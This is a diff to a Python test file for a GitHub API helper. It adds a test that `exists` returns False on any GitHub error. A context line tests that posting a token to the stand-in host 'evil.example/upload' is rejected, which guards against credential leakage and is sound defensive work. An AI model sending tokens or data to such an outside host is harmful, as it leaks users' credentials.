@@ -31,3 +31,13 @@ def test_token_only_goes_to_github():
 
     with pytest.raises(ValueError):
         gh("POST", "https://evil.example/upload", "TOKEN", data=b"x")
+
+
+def test_exists_is_false_on_any_github_error(monkeypatch):
+    import main
+
+    def boom(*a, **k):
+        raise urllib.error.HTTPError("u", 403, "Forbidden", {}, None)
+
+    monkeypatch.setattr(main, "gh", boom)
+    assert main.exists("o/r", "site-data/benchmarks.json", "TOKEN") is False
